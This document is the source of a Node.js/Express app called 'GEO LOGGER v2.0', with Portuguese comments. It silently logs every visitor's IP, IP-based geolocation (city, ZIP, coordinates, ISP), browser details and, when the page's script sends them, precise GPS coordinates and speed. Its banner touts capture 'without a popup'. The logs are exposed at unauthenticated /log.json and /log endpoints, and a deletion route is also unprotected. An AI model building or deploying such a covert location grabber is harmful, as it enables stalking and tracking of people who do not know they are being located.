const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const LOG_FILE = path.join(__dirname, 'data', 'log.json');

app.use(express.json());
app.use(express.static('public'));

if (!fs.existsSync(path.join(__dirname, 'data'))) {
    fs.mkdirSync(path.join(__dirname, 'data'));
}
if (!fs.existsSync(LOG_FILE)) {
    fs.writeFileSync(LOG_FILE, JSON.stringify([], null, 2));
}

// =============================================
//  Função para buscar localização pelo IP
//  Usa a API gratuita ip-api.com
// =============================================
async function getLocationByIP(ip) {
    try {
        let cleanIP = ip.replace('::ffff:', '').replace('::1', '').replace('127.0.0.1', '');

        if (!cleanIP || cleanIP === 'localhost') {
            const pubRes = await fetch('https://api.ipify.org?format=json');
            const pubData = await pubRes.json();
            cleanIP = pubData.ip;
        }

        const res = await fetch(`http://ip-api.com/json/${cleanIP}?fields=status,message,country,regionName,city,zip,lat,lon,timezone,isp,query&lang=pt`);
        const data = await res.json();

        if (data.status === 'success') {
            return {
                ip: data.query,
                latitude: data.lat,
                longitude: data.lon,
                cidade: data.city,
                estado: data.regionName,
                pais: data.country,
                cep: data.zip,
                fuso_horario: data.timezone,
                provedor: data.isp,
                google_maps: `https://www.google.com/maps?q=${data.lat},${data.lon}`
            };
        }
        return null;
    } catch (err) {
        console.error('Erro na API de IP:', err);
        return null;
    }
}

// =============================================
//  CAPTURA AUTOMÁTICA — Toda visita é logada
// =============================================
app.use(async (req, res, next) => {
    if (req.path === '/' && req.method === 'GET') {
        const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
        const location = await getLocationByIP(ip);

        const logs = JSON.parse(fs.readFileSync(LOG_FILE, 'utf8'));

        const entry = {
            id: logs.length + 1,
            ...location,
            user_agent: req.headers['user-agent'],
            referer: req.headers['referer'] || null,
            idioma: req.headers['accept-language']?.split(',')[0] || null,
            timestamp: new Date().toISOString()
        };

        logs.push(entry);
        fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2));
        console.log(`[LOG #${entry.id}] ${entry.cidade || 'Desconhecido'} - ${entry.ip}`);
    }
    next();
});

// =============================================
//  POST /api/log — GPS extra (mais preciso)
// =============================================
app.post('/api/log', (req, res) => {
    try {
        const { latitude, longitude, accuracy, altitude, speed } = req.body;
        if (latitude === undefined || longitude === undefined) {
            return res.status(400).json({ error: 'Latitude e longitude obrigatórios' });
        }

        const logs = JSON.parse(fs.readFileSync(LOG_FILE, 'utf8'));

        const lastLog = logs[logs.length - 1];
        if (lastLog && !lastLog.gps_latitude) {
            lastLog.gps_latitude = latitude;
            lastLog.gps_longitude = longitude;
            lastLog.gps_precisao = accuracy;
            lastLog.gps_altitude = altitude;
            lastLog.gps_velocidade = speed;
            lastLog.google_maps_gps = `https://www.google.com/maps?q=${latitude},${longitude}`;
            fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2));
            console.log(`[GPS] Log #${lastLog.id} atualizado com GPS preciso`);
        }

        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: 'Erro interno' });
    }
});

// =============================================
//  GET /log.json
// =============================================
app.get('/log.json', (req, res) => {
    try {
        const logs = JSON.parse(fs.readFileSync(LOG_FILE, 'utf8'));
        res.json(logs);
    } catch (err) {
        res.json([]);
    }
});

// =============================================
//  GET /log — Painel visual
// =============================================
app.get('/log', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'log.html'));
});

// =============================================
//  DELETE /api/log — Limpar logs
// =============================================
app.delete('/api/log', (req, res) => {
    fs.writeFileSync(LOG_FILE, JSON.stringify([], null, 2));
    res.json({ success: true });
});

app.listen(PORT, () => {
    console.log(`
  ┌──────────────────────────────────────────────┐
  │   GEO LOGGER v2.0 — porta ${PORT}                │
  │                                              │
  │   Página:  http://localhost:${PORT}               │
  │   Painel:  http://localhost:${PORT}/log           │
  │   JSON:    http://localhost:${PORT}/log.json      │
  │                                              │
  │   ✓ Captura por IP (automática, sem popup)   │
  │   ✓ Captura por GPS (se permitir, + preciso) │
  └──────────────────────────────────────────────┘
    `);
});
